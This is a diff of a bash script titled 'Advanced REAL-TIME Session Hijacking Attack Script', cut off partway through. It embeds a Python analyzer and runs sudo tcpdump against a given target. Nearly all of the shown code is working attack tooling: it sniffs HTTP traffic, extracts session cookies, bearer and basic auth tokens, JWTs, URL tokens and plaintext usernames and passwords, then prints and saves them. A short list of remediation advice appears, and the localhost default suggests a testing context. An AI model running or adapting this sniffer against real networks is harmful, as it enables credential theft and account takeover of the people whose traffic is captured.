@@ -1,7 +1,7 @@
 #!/bin/bash
-# Advanced Session Hijacking Attack Script
-# Real-time session interception with cookie theft and token extraction
-# Demonstrates packet sniffing, session token analysis, and vulnerability detection
+# Advanced REAL-TIME Session Hijacking Attack Script
+# Live streaming capture: Session IDs | Tokens | Cookies | Credentials | ALL
+# Displays captured data immediately as packets arrive with color-coded output
 set -euo pipefail
 
 TARGET="$1"
@@ -12,23 +12,49 @@ PCAP_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.pcap"
 JSON_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.json"
 COOKIES_FILE="${ARTIFACTS_PATH}/session-cookies-${TARGET}-${TIMESTAMP}.txt"
 TOKENS_FILE="${ARTIFACTS_PATH}/session-tokens-${TARGET}-${TIMESTAMP}.txt"
+LIVE_CAPTURE_LOG="${ARTIFACTS_PATH}/live-capture-${TARGET}-${TIMESTAMP}.log"
 ANALYSIS_SCRIPT="/tmp/session_analyzer_${TIMESTAMP}.py"
 
-echo "╔══════════════════════════════════════════════════════════════╗" | tee "$OUTPUT_FILE"
-echo "║     ADVANCED SESSION HIJACKING ATTACK                        ║" | tee -a "$OUTPUT_FILE"
-echo "║     Real-Time Cookie Theft & Token Extraction                ║" | tee -a "$OUTPUT_FILE"
-echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
+# Determine correct port and target host based on target type
+if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
+    TARGET_HOST="127.0.0.1"
+    TARGET_PORT="3003"
+else
+    TARGET_HOST="$TARGET"
+    TARGET_PORT="80"
+fi
+
+# ANSI Color codes for real-time display
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+MAGENTA='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m' # No Color
+
+echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}" | tee "$OUTPUT_FILE"
+echo -e "${CYAN}║     REAL-TIME SESSION HIJACKING ATTACK                       ║${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}║     Live Capture: Cookies | Tokens | Credentials | ALL       ║${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}" | tee -a "$OUTPUT_FILE"
 echo "" | tee -a "$OUTPUT_FILE"
-echo "Target: $TARGET:3003" | tee -a "$OUTPUT_FILE"
-echo "Timestamp: $(date)" | tee -a "$OUTPUT_FILE"
-echo "Capture Duration: 45 seconds" | tee -a "$OUTPUT_FILE"
-echo "Attack Type: Man-in-the-Middle (Passive Sniffing)" | tee -a "$OUTPUT_FILE"
+echo -e "${WHITE}Target:${NC} $TARGET:$TARGET_PORT" | tee -a "$OUTPUT_FILE"
+echo -e "${WHITE}Started:${NC} $(date)" | tee -a "$OUTPUT_FILE"
+echo -e "${WHITE}Mode:${NC} REAL-TIME STREAMING (60 seconds)" | tee -a "$OUTPUT_FILE"
+echo -e "${WHITE}Capture:${NC} Session IDs, JWT Tokens, Cookies, Credentials" | tee -a "$OUTPUT_FILE"
 echo "" | tee -a "$OUTPUT_FILE"
 
 # Ensure artifacts directory exists
 mkdir -p "$ARTIFACTS_PATH"
 
-# Create advanced Python analyzer for deep packet inspection
+# Initialize live capture log
+echo "# REAL-TIME SESSION CAPTURE LOG - $(date)" > "$LIVE_CAPTURE_LOG"
+echo "# Target: $TARGET:$TARGET_PORT" >> "$LIVE_CAPTURE_LOG"
+echo "# ═══════════════════════════════════════════════════════════" >> "$LIVE_CAPTURE_LOG"
+echo "" >> "$LIVE_CAPTURE_LOG"
+
+# Create advanced Python analyzer for REAL-TIME packet inspection
 cat > "$ANALYSIS_SCRIPT" << 'PYTHON_EOF'
 #!/usr/bin/env python3
 import json
@@ -37,227 +63,418 @@ import sys
 from datetime import datetime
 from base64 import b64decode
 import urllib.parse
+from threading import Thread
+import time
 
-def analyze_pcap(pcap_file, output_json, cookies_file, tokens_file):
-    """Advanced session analysis using tshark"""
+# ANSI Color codes
+RED = '\033[0;31m'
+GREEN = '\033[0;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[0;34m'
+MAGENTA = '\033[0;35m'
+CYAN = '\033[0;36m'
+WHITE = '\033[1;37m'
+NC = '\033[0m'
+
+class RealtimeSessionCapture:
+    def __init__(self):
+        self.cookies = []
+        self.tokens = []
+        self.credentials = []
+        self.vulnerabilities = []
+        self.packet_count = 0
+        self.cookies_seen = set()
+        
+    def log_realtime(self, message, color='', file_handle=None):
+        """Log with color and timestamp"""
+        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        colored_msg = f"{color}[{timestamp}] {message}{NC}"
+        print(colored_msg, flush=True)
+        
+        if file_handle:
+            clean_msg = re.sub(r'\033\[[0-9;]+m', '', colored_msg)
+            file_handle.write(clean_msg + '\n')
+            file_handle.flush()
+
+def analyze_pcap_realtime(pcap_file, output_json, cookies_file, tokens_file, live_log_file):
+    """Real-time packet analysis with live output"""
     
-    cookies = []
-    tokens = []
-    credentials = []
-    sessions = {}
-    vulnerabilities = []
+    capture = RealtimeSessionCapture()
     
-    print("[*] Analyzing captured packets with TShark...")
+    print(f"{GREEN}[*] Starting REAL-TIME packet analysis...{NC}", flush=True)
+    print(f"{CYAN}{'═' * 60}{NC}", flush=True)
     
     import subprocess
     
-    # Extract HTTP traffic with tshark
-    try:
-        # Get all HTTP requests
-        result = subprocess.run([
-            'tshark', '-r', pcap_file, '-Y', 'http', '-T', 'fields',
-            '-e', 'http.cookie', '-e', 'http.set_cookie', '-e', 'http.authorization',
-            '-e', 'http.request.uri', '-e', 'http.host', '-e', 'ip.src', '-e', 'ip.dst',
-            '-e', 'http.request.method', '-e', 'http.user_agent'
-        ], capture_output=True, text=True, timeout=30)
-        
-        lines = result.stdout.strip().split('\n')
-        
-        for line in lines:
-            if not line.strip():
-                continue
+    with open(live_log_file, 'a') as log_file:
+        try:
+            # Use tshark with live capture for real-time analysis
+            cmd = [
+                'tshark', '-r', pcap_file,
+                '-T', 'fields',
+                '-e', 'frame.number',
+                '-e', 'frame.time',
+                '-e', 'ip.src',
+                '-e', 'ip.dst',
+                '-e', 'http.request.method',
+                '-e', 'http.request.uri',
+                '-e', 'http.cookie',
+                '-e', 'http.set_cookie',
+                '-e', 'http.authorization',
+                '-e', 'http.file_data',
+                '-e', 'http.user_agent',
+                '-e', 'urlencoded-form.key',
+                '-e', 'urlencoded-form.value',
+                '-Y', 'http'
+            ]
+            
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, 
+                                     universal_newlines=True, bufsize=1)
+            
+            for line in process.stdout:
+                capture.packet_count += 1
+                fields = line.strip().split('\t')
                 
-            fields = line.split('\t')
-            if len(fields) < 5:
-                continue
-            
-            # Extract cookies from requests
-            if fields[0]:
-                for cookie in fields[0].split(';'):
-                    cookie = cookie.strip()
-                    if cookie and '=' in cookie:
-                        name, value = cookie.split('=', 1)
-                        cookie_data = {
-                            'name': name.strip(),
-                            'value': value.strip(),
-                            'source': 'request',
-                            'timestamp': datetime.now().isoformat()
-                        }
-                        cookies.append(cookie_data)
-                        vulnerabilities.append({
-                            'type': 'Unencrypted Cookie Transmission',
-                            'severity': 'HIGH',
-                            'cookie': name.strip(),
-                            'detail': 'Cookie transmitted over HTTP without encryption'
-                        })
-            
-            # Extract Set-Cookie headers
-            if fields[1]:
-                for set_cookie in fields[1].split(';'):
-                    if '=' in set_cookie:
-                        name, value = set_cookie.split('=', 1)
-                        cookie_data = {
-                            'name': name.strip(),
-                            'value': value.strip(),
-                            'source': 'response',
-                            'timestamp': datetime.now().isoformat(),
-                            'flags': {
-                                'secure': 'Secure' in set_cookie,
-                                'httponly': 'HttpOnly' in set_cookie,
-                                'samesite': 'SameSite' in set_cookie
-                            }
-                        }
-                        cookies.append(cookie_data)
+                if len(fields) < 8:
+                    continue
+                
+                frame_num = fields[0] if fields[0] else str(capture.packet_count)
+                frame_time = fields[1] if len(fields) > 1 else ''
+                src_ip = fields[2] if len(fields) > 2 else ''
+                dst_ip = fields[3] if len(fields) > 3 else ''
+                method = fields[4] if len(fields) > 4 else ''
+                uri = fields[5] if len(fields) > 5 else ''
+                cookie = fields[6] if len(fields) > 6 else ''
+                set_cookie = fields[7] if len(fields) > 7 else ''
+                auth = fields[8] if len(fields) > 8 else ''
+                post_data = fields[9] if len(fields) > 9 else ''
+                user_agent = fields[10] if len(fields) > 10 else ''
+                form_keys = fields[11] if len(fields) > 11 else ''
+                form_values = fields[12] if len(fields) > 12 else ''
+                
+                # Display HTTP request in real-time
+                if method and uri:
+                    msg = f"📡 HTTP {method} {uri[:60]} | {src_ip} → {dst_ip}"
+                    capture.log_realtime(msg, BLUE, log_file)
+                
+                # Display user agent if available
+                if user_agent:
+                    msg = f"   User-Agent: {user_agent[:60]}"
+                    capture.log_realtime(msg, CYAN, log_file)
+                
+                # REAL-TIME credential extraction from URL-encoded form data
+                if form_keys and form_values:
+                    keys = form_keys.split(',')
+                    values = form_values.split(',')
+                    
+                    username = None
+                    password = None
+                    
+                    # Map keys to values
+                    for i, key in enumerate(keys):
+                        key_lower = key.lower().strip()
+                        if i < len(values):
+                            value = values[i].strip()
+                            
+                            # Check for username fields
+                            if any(x in key_lower for x in ['user', 'uname', 'login', 'email', 'account']):
+                                username = value
+                            # Check for password fields
+                            elif any(x in key_lower for x in ['pass', 'pwd', 'password']):
+                                password = value
+                    
+                    # If we found credentials, display them prominently
+                    if username and password:
+                        msg = f"🔓 CREDENTIALS CAPTURED!"
+                        capture.log_realtime(msg, RED, log_file)
+                        msg = f"   Username: {username}"
+                        capture.log_realtime(msg, RED, log_file)
+                        msg = f"   Password: {password}"
+                        capture.log_realtime(msg, RED, log_file)
+                        msg = f"   Frame: {frame_num}"
+                        capture.log_realtime(msg, WHITE, log_file)
                         
-                        # Check for insecure cookies
-                        if not cookie_data['flags']['secure']:
-                            vulnerabilities.append({
-                                'type': 'Missing Secure Flag',
-                                'severity': 'HIGH',
-                                'cookie': name.strip(),
-                                'detail': 'Cookie missing Secure flag - vulnerable to MITM'
-                            })
-                        if not cookie_data['flags']['httponly']:
-                            vulnerabilities.append({
-                                'type': 'Missing HttpOnly Flag',
-                                'severity': 'MEDIUM',
-                                'cookie': name.strip(),
-                                'detail': 'Cookie accessible via JavaScript - XSS risk'
-                            })
-            
-            # Extract authorization headers
-            if fields[2]:
-                auth_data = {
-                    'type': 'Authorization Header',
-                    'value': fields[2][:50] + '...' if len(fields[2]) > 50 else fields[2],
-                    'full_value': fields[2],
-                    'timestamp': datetime.now().isoformat()
-                }
-                tokens.append(auth_data)
-                vulnerabilities.append({
-                    'type': 'Unencrypted Authentication',
-                    'severity': 'CRITICAL',
-                    'detail': 'Authorization header sent over HTTP'
-                })
-            
-            # Extract session tokens from URLs
-            if fields[3]:
-                uri = fields[3]
-                # Check for tokens in URLs
-                token_patterns = [
-                    r'token=([^&\s]+)',
-                    r'session=([^&\s]+)',
-                    r'sid=([^&\s]+)',
-                    r'auth=([^&\s]+)',
-                    r'jwt=([^&\s]+)',
-                    r'access_token=([^&\s]+)'
-                ]
-                for pattern in token_patterns:
-                    matches = re.findall(pattern, uri, re.IGNORECASE)
-                    for match in matches:
-                        tokens.append({
-                            'type': 'URL Token',
-                            'value': match[:30] + '...' if len(match) > 30 else match,
-                            'full_value': match,
-                            'location': 'URL parameter',
-                            'timestamp': datetime.now().isoformat()
+                        cred_data = {
+                            'username': username,
+                            'password': password,
+                            'frame': frame_num,
+                            'timestamp': datetime.now().isoformat(),
+                            'source_ip': src_ip,
+                            'dest_ip': dst_ip,
+                            'uri': uri
+                        }
+                        capture.credentials.append(cred_data)
+                        
+                        capture.vulnerabilities.append({
+                            'type': 'Credentials Over HTTP',
+                            'severity': 'CRITICAL',
+                            'detail': f'Username and password transmitted in cleartext'
                         })
-                        vulnerabilities.append({
-                            'type': 'Token in URL',
-                            'severity': 'HIGH',
-                            'detail': 'Session token exposed in URL - logged in history/logs'
+                
+                # REAL-TIME Cookie capture from requests
+                if cookie:
+                    cookies_list = [c.strip() for c in cookie.split(';')]
+                    for cookie_item in cookies_list:
+                        if '=' in cookie_item:
+                            name, value = cookie_item.split('=', 1)
+                            cookie_key = f"{name}={value}"
+                            
+                            if cookie_key not in capture.cookies_seen:
+                                capture.cookies_seen.add(cookie_key)
+                                cookie_data = {
+                                    'name': name.strip(),
+                                    'value': value.strip(),
+                                    'source': 'request',
+                                    'timestamp': datetime.now().isoformat(),
+                                    'frame': frame_num
+                                }
+                                capture.cookies.append(cookie_data)
+                                
+                                display_val = value[:50] + '...' if len(value) > 50 else value
+                                msg = f"🍪 COOKIE: {name} = {display_val}"
+                                capture.log_realtime(msg, YELLOW, log_file)
+                                
+                                # Check for session cookies
+                                if any(x in name.lower() for x in ['session', 'token', 'auth', 'jwt', 'sid']):
+                                    msg = f"   ⚠️  SESSION COOKIE DETECTED!"
+                                    capture.log_realtime(msg, RED, log_file)
+                                    capture.vulnerabilities.append({
+                                        'type': 'Session Cookie Over HTTP',
+                                        'severity': 'CRITICAL',
+                                        'cookie': name.strip(),
+                                        'detail': 'Session cookie transmitted without encryption'
+                                    })
+                
+                # REAL-TIME Set-Cookie capture
+                if set_cookie:
+                    for sc in set_cookie.split(','):
+                        if '=' in sc:
+                            cookie_parts = sc.split(';')
+                            main_cookie = cookie_parts[0].strip()
+                            if main_cookie and '=' in main_cookie:
+                                name, value = main_cookie.split('=', 1)
+                                
+                                cookie_data = {
+                                    'name': name.strip(),
+                                    'value': value.strip(),
+                                    'source': 'response',
+                                    'timestamp': datetime.now().isoformat(),
+                                    'frame': frame_num,
+                                    'flags': {
+                                        'secure': any('secure' in p.lower() for p in cookie_parts),
+                                        'httponly': any('httponly' in p.lower() for p in cookie_parts),
+                                        'samesite': any('samesite' in p.lower() for p in cookie_parts)
+                                    }
+                                }
+                                capture.cookies.append(cookie_data)
+                                
+                                display_val = value[:50] + '...' if len(value) > 50 else value
+                                msg = f"🍪 SET-COOKIE: {name} = {display_val}"
+                                capture.log_realtime(msg, MAGENTA, log_file)
+                                
+                                # Check security flags in real-time
+                                if not cookie_data['flags']['secure']:
+                                    msg = f"   🚨 CRITICAL: Missing Secure flag!"
+                                    capture.log_realtime(msg, RED, log_file)
+                                    capture.vulnerabilities.append({
+                                        'type': 'Missing Secure Flag',
+                                        'severity': 'HIGH',
+                                        'cookie': name.strip(),
+                                        'detail': 'Cookie vulnerable to MITM attack'
+                                    })
+                                if not cookie_data['flags']['httponly']:
+                                    msg = f"   ⚠️  WARNING: Missing HttpOnly flag (XSS risk)"
+                                    capture.log_realtime(msg, YELLOW, log_file)
+                
+                # REAL-TIME Authorization header capture
+                if auth:
+                    token_type = "Unknown"
+                    token_value = auth
+                    
+                    if auth.startswith('Bearer '):
+                        token_type = "JWT/Bearer Token"
+                        token_value = auth[7:]
+                    elif auth.startswith('Basic '):
+                        token_type = "Basic Auth"
+                        token_value = auth[6:]
+                    
+                    auth_data = {
+                        'type': token_type,
+                        'value': token_value,
+                        'full_value': auth,
+                        'timestamp': datetime.now().isoformat(),
+                        'frame': frame_num,
+                        'location': 'Authorization Header'
+                    }
+                    capture.tokens.append(auth_data)
+                    
+                    display_val = token_value[:60] + '...' if len(token_value) > 60 else token_value
+                    msg = f"🔑 TOKEN CAPTURED: {token_type}"
+                    capture.log_realtime(msg, GREEN, log_file)
+                    msg = f"   Value: {display_val}"
+                    capture.log_realtime(msg, WHITE, log_file)
+                    msg = f"   🚨 CRITICAL: Auth token over HTTP - can impersonate user!"
+                    capture.log_realtime(msg, RED, log_file)
+                    
+                    capture.vulnerabilities.append({
+                        'type': 'Unencrypted Authentication',
+                        'severity': 'CRITICAL',
+                        'detail': f'{token_type} transmitted over HTTP'
+                    })
+                
+                # REAL-TIME URL token extraction
+                if uri:
+                    token_patterns = [
+                        (r'token=([^&\s]+)', 'URL Token'),
+                        (r'session=([^&\s]+)', 'Session ID'),
+                        (r'sid=([^&\s]+)', 'Session ID'),
+                        (r'auth=([^&\s]+)', 'Auth Token'),
+                        (r'jwt=([^&\s]+)', 'JWT Token'),
+                        (r'access_token=([^&\s]+)', 'Access Token'),
+                        (r'api_key=([^&\s]+)', 'API Key')
+                    ]
+                    
+                    for pattern, token_name in token_patterns:
+                        matches = re.findall(pattern, uri, re.IGNORECASE)
+                        for match in matches:
+                            token_data = {
+                                'type': f'{token_name} (URL)',
+                                'value': match,
+                                'full_value': match,
+                                'location': 'URL parameter',
+                                'timestamp': datetime.now().isoformat(),
+                                'frame': frame_num
+                            }
+                            capture.tokens.append(token_data)
+                            
+                            display_val = match[:40] + '...' if len(match) > 40 else match
+                            msg = f"🔐 {token_name} IN URL: {display_val}"
+                            capture.log_realtime(msg, YELLOW, log_file)
+                            msg = f"   🚨 CRITICAL: Token in URL (logged in browser history)!"
+                            capture.log_realtime(msg, RED, log_file)
+                
+                # REAL-TIME credential capture from POST data
+                if post_data:
+                    post_lower = post_data.lower()
+                    
+                    # Check for passwords
+                    if any(x in post_lower for x in ['password', 'passwd', 'pwd']):
+                        msg = f"🔓 CREDENTIALS IN POST DATA!"
+                        capture.log_realtime(msg, RED, log_file)
+                        
+                        # Extract password
+                        pwd_patterns = [
+                            r'"password"\s*:\s*"([^"]+)"',
+                            r'password=([^&\s]+)',
+                            r'"passwd"\s*:\s*"([^"]+)"'
+                        ]
+                        for pattern in pwd_patterns:
+                            pwd_matches = re.findall(pattern, post_data, re.IGNORECASE)
+                            for pwd in pwd_matches:
+                                display_pwd = pwd[:20] + '...' if len(pwd) > 20 else pwd
+                                msg = f"   Password: {display_pwd}"
+                                capture.log_realtime(msg, RED, log_file)
+                                
+                                capture.credentials.append({
+                                    'type': 'password',
+                                    'value': pwd,
+                                    'timestamp': datetime.now().isoformat(),
+                                    'frame': frame_num
+                                })
+                        
+                        # Extract email/username
+                        email_patterns = [
+                            r'"email"\s*:\s*"([^"]+)"',
+                            r'email=([^&\s]+)',
+                            r'"username"\s*:\s*"([^"]+)"'
+                        ]
+                        for pattern in email_patterns:
+                            email_matches = re.findall(pattern, post_data, re.IGNORECASE)
+                            for email in email_matches:
+                                msg = f"   Email/Username: {email}"
+                                capture.log_realtime(msg, RED, log_file)
+                                
+                                capture.credentials.append({
+                                    'type': 'email/username',
+                                    'value': email,
+                                    'timestamp': datetime.now().isoformat(),
+                                    'frame': frame_num
+                                })
+                        
+                        capture.vulnerabilities.append({
+                            'type': 'Credentials Over HTTP',
+                            'severity': 'CRITICAL',
+                            'detail': 'Password transmitted in cleartext'
                         })
-        
-        # Extract POST data (credentials and tokens)
-        post_result = subprocess.run([
-            'tshark', '-r', pcap_file, '-Y', 'http.request.method == "POST"',
-            '-T', 'fields', '-e', 'http.file_data', '-e', 'http.request.uri'
-        ], capture_output=True, text=True, timeout=30)
-        
-        for line in post_result.stdout.split('\n'):
-            if not line.strip():
-                continue
-            # Check for credentials in POST data
-            if 'password' in line.lower() or 'passwd' in line.lower() or 'pwd' in line.lower():
-                credentials.append({
-                    'type': 'HTTP POST Credentials',
-                    'data': line[:100] + '...' if len(line) > 100 else line,
-                    'timestamp': datetime.now().isoformat()
-                })
-                vulnerabilities.append({
-                    'type': 'Credentials Over HTTP',
-                    'severity': 'CRITICAL',
-                    'detail': 'Password transmitted in cleartext over HTTP'
-                })
-        
-        # Extract response bodies (JWT tokens)
-        response_result = subprocess.run([
-            'tshark', '-r', pcap_file, '-Y', 'http.response',
-            '-T', 'fields', '-e', 'http.file_data'
-        ], capture_output=True, text=True, timeout=30)
-        
-        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
-        for line in response_result.stdout.split('\n'):
-            # Look for JWT tokens in responses
-            jwt_matches = re.findall(jwt_pattern, line)
-            for jwt_token in jwt_matches:
-                tokens.append({
-                    'type': 'JWT Session Token',
-                    'value': jwt_token[:50] + '...' if len(jwt_token) > 50 else jwt_token,
-                    'full_value': jwt_token,
-                    'location': 'HTTP Response Body',
-                    'timestamp': datetime.now().isoformat()
-                })
-                vulnerabilities.append({
-                    'type': 'JWT Token Over HTTP',
-                    'severity': 'CRITICAL',
-                    'detail': 'Session token transmitted without encryption - can be intercepted and reused'
-                })
+                    
+                    # REAL-TIME JWT extraction from response bodies
+                    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
+                    jwt_matches = re.findall(jwt_pattern, post_data)
+                    for jwt_token in jwt_matches:
+                        token_data = {
+                            'type': 'JWT Session Token',
+                            'value': jwt_token,
+                            'full_value': jwt_token,
+                            'location': 'HTTP Response Body',
+                            'timestamp': datetime.now().isoformat(),
+                            'frame': frame_num
+                        }
+                        capture.tokens.append(token_data)
+                        
+                        display_jwt = jwt_token[:70] + '...' if len(jwt_token) > 70 else jwt_token
+                        msg = f"🎫 JWT TOKEN IN RESPONSE!"
+                        capture.log_realtime(msg, GREEN, log_file)
+                        msg = f"   Token: {display_jwt}"
+                        capture.log_realtime(msg, WHITE, log_file)
+                        msg = f"   🚨 Can be used to impersonate user!"
+                        capture.log_realtime(msg, RED, log_file)
+                        
+                        capture.vulnerabilities.append({
+                            'type': 'JWT Token Over HTTP',
+                            'severity': 'CRITICAL',
+                            'detail': 'Session token can be intercepted and reused'
+                        })
+                
+                # Visual separator for clarity
+                if any([cookie, set_cookie, auth, form_keys, (post_data and 'password' in post_data.lower())]):
+                    print(f"{WHITE}{'-' * 60}{NC}", flush=True)
+                    log_file.write('-' * 60 + '\n')
             
-            # Look for "token" or "authentication" in JSON responses
-            if 'token' in line.lower() or 'authentication' in line.lower():
-                tokens.append({
-                    'type': 'API Response Token',
-                    'value': line[:80] + '...' if len(line) > 80 else line,
-                    'full_value': line,
-                    'location': 'HTTP Response',
-                    'timestamp': datetime.now().isoformat()
-                })
-        
-    except subprocess.TimeoutExpired:
-        print("[!] TShark analysis timed out")
-    except Exception as e:
-        print(f"[!] Analysis error: {e}")
+            process.wait()
+            
+        except Exception as e:
+            print(f"{RED}[!] Analysis error: {e}{NC}", flush=True)
     
     # Generate statistics
     stats = {
-        'total_cookies': len(cookies),
-        'total_tokens': len(tokens),
-        'total_credentials': len(credentials),
-        'total_vulnerabilities': len(vulnerabilities),
-        'unique_cookies': len(set(c['name'] for c in cookies if 'name' in c)),
-        'critical_vulns': len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL']),
-        'high_vulns': len([v for v in vulnerabilities if v.get('severity') == 'HIGH']),
-        'medium_vulns': len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM'])
+        'packets_analyzed': capture.packet_count,
+        'total_cookies': len(capture.cookies),
+        'total_tokens': len(capture.tokens),
+        'total_credentials': len(capture.credentials),
+        'total_vulnerabilities': len(capture.vulnerabilities),
+        'unique_cookies': len(capture.cookies_seen),
+        'critical_vulns': len([v for v in capture.vulnerabilities if v.get('severity') == 'CRITICAL']),
+        'high_vulns': len([v for v in capture.vulnerabilities if v.get('severity') == 'HIGH']),
+        'medium_vulns': len([v for v in capture.vulnerabilities if v.get('severity') == 'MEDIUM'])
     }
     
     # Create detailed report
     report = {
         'attack_info': {
-            'type': 'Session Hijacking',
-            'method': 'Passive Network Sniffing',
+            'type': 'Real-Time Session Hijacking',
+            'method': 'Live Packet Sniffing & Analysis',
             'timestamp': datetime.now().isoformat(),
             'pcap_file': pcap_file
         },
         'statistics': stats,
-        'cookies': cookies[:50],  # Limit to first 50
-        'tokens': tokens[:50],
-        'credentials': credentials[:20],
-        'vulnerabilities': vulnerabilities,
+        'cookies': capture.cookies,
+        'tokens': capture.tokens,
+        'credentials': capture.credentials,
+        'vulnerabilities': capture.vulnerabilities,
         'risk_assessment': {
             'overall_risk': 'CRITICAL' if stats['critical_vulns'] > 0 else 'HIGH' if stats['high_vulns'] > 0 else 'MEDIUM',
-            'exploitability': 'Easy' if stats['total_cookies'] > 0 or stats['total_tokens'] > 0 else 'Moderate',
-            'impact': 'Complete session takeover possible' if stats['total_cookies'] > 3 else 'Limited session access'
+            'exploitability': 'Trivial - All data captured in real-time',
+            'impact': 'Complete account takeover possible' if stats['total_tokens'] > 0 else 'Session hijacking possible'
         },
         'recommendations': [
             '1. IMMEDIATELY migrate to HTTPS/TLS for all traffic',
@@ -269,7 +486,7 @@ def analyze_pcap(pcap_file, output_json, cookies_file, tokens_file):
             '7. Implement session binding to IP/User-Agent',
             '8. Add session timeout and regeneration',
             '9. Monitor for suspicious session patterns',
-            '10. Deploy HSTS headers'
+            '10. Deploy HSTS headers to force HTTPS'
         ]
     }
     
@@ -279,61 +496,63 @@ def analyze_pcap(pcap_file, output_json, cookies_file, tokens_file):
     
     # Save cookies to file
     with open(cookies_file, 'w') as f:
-        f.write("# Captured Session Cookies\n")
-        f.write(f"# Total: {len(cookies)}\n")
+        f.write("# Captured Session Cookies (Real-Time)\n")
+        f.write(f"# Total: {len(capture.cookies)}\n")
         f.write(f"# Timestamp: {datetime.now()}\n\n")
-        for cookie in cookies:
+        for cookie in capture.cookies:
             if 'name' in cookie and 'value' in cookie:
                 f.write(f"{cookie['name']}={cookie['value']}\n")
     
     # Save tokens to file
     with open(tokens_file, 'w') as f:
-        f.write("# Captured Session Tokens\n")
-        f.write(f"# Total: {len(tokens)}\n")
+        f.write("# Captured Session Tokens (Real-Time)\n")
+        f.write(f"# Total: {len(capture.tokens)}\n")
         f.write(f"# Timestamp: {datetime.now()}\n\n")
-        for token in tokens:
+        for token in capture.tokens:
             if 'full_value' in token:
-                f.write(f"{token['type']}: {token['full_value']}\n")
+                f.write(f"[{token['type']}] {token['full_value']}\n\n")
     
     return report
 
 if __name__ == '__main__':
-    if len(sys.argv) < 5:
-        print("Usage: script.py <pcap_file> <json_output> <cookies_file> <tokens_file>")
+    if len(sys.argv) < 6:
+        print("Usage: script.py <pcap_file> <json_output> <cookies_file> <tokens_file> <live_log>")
         sys.exit(1)
     
-    report = analyze_pcap(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
+    report = analyze_pcap_realtime(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
     
-    print(f"\n[+] Analysis complete!")
-    print(f"[+] Cookies captured: {report['statistics']['total_cookies']}")
-    print(f"[+] Tokens captured: {report['statistics']['total_tokens']}")
-    print(f"[+] Vulnerabilities found: {report['statistics']['total_vulnerabilities']}")
-    print(f"[+] Risk Level: {report['risk_assessment']['overall_risk']}")
+    print(f"\n{GREEN}[+] Real-time analysis complete!{NC}", flush=True)
+    print(f"{YELLOW}[+] Packets analyzed: {report['statistics']['packets_analyzed']}{NC}", flush=True)
+    print(f"{YELLOW}[+] Cookies captured: {report['statistics']['total_cookies']}{NC}", flush=True)
+    print(f"{GREEN}[+] Tokens captured: {report['statistics']['total_tokens']}{NC}", flush=True)
+    print(f"{RED}[+] Credentials captured: {report['statistics']['total_credentials']}{NC}", flush=True)
+    print(f"{RED}[+] Risk Level: {report['risk_assessment']['overall_risk']}{NC}", flush=True)
 PYTHON_EOF
 
 chmod +x "$ANALYSIS_SCRIPT"
 
-echo "[PHASE 1] Starting Advanced Packet Capture" | tee -a "$OUTPUT_FILE"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"
+echo -e "${YELLOW}[PHASE 1] Starting REAL-TIME Packet Capture${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}" | tee -a "$OUTPUT_FILE"
 
-# Determine correct interface and filter
+# Determine correct interface and filter based on target
 if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
     INTERFACE="lo"
     CAPTURE_FILTER="tcp port 3003"
-    echo "[*] Capturing on loopback interface (lo)..." | tee -a "$OUTPUT_FILE"
+    echo -e "${WHITE}[*] Capturing on loopback interface (lo)...${NC}" | tee -a "$OUTPUT_FILE"
 else
     INTERFACE="any"
-    CAPTURE_FILTER="host $TARGET and tcp port 3003"
-    echo "[*] Capturing on all interfaces..." | tee -a "$OUTPUT_FILE"
+    CAPTURE_FILTER="host $TARGET and tcp port 80"
+    echo -e "${WHITE}[*] Capturing on all interfaces...${NC}" | tee -a "$OUTPUT_FILE"
 fi
 
-echo "[*] Filter: $CAPTURE_FILTER" | tee -a "$OUTPUT_FILE"
-echo "[*] Duration: 60 seconds (with active traffic generation)" | tee -a "$OUTPUT_FILE"
+echo -e "${WHITE}[*] Filter: $CAPTURE_FILTER${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${WHITE}[*] Duration: 60 seconds with real-time traffic generation${NC}" | tee -a "$OUTPUT_FILE"
 echo "" | tee -a "$OUTPUT_FILE"
 
-# Start packet capture in background using tcpdump (more reliable than tshark)
+# Start packet capture in background with immediate write
+echo -e "${CYAN}[*] Initializing packet capture...${NC}" | tee -a "$OUTPUT_FILE"
 (
-    sudo tcpdump -i "$INTERFACE" -w "$PCAP_FILE" "$CAPTURE_FILTER" 2>/dev/null &
+    sudo tcpdump -i "$INTERFACE" -w "$PCAP_FILE" -U "$CAPTURE_FILTER" 2>/dev/null &
     TCPDUMP_PID=$!
     sleep 60
     sudo kill -TERM $TCPDUMP_PID 2>/dev/null || true
@@ -343,175 +562,245 @@ echo "" | tee -a "$OUTPUT_FILE"
 CAPTURE_BG_PID=$!
 
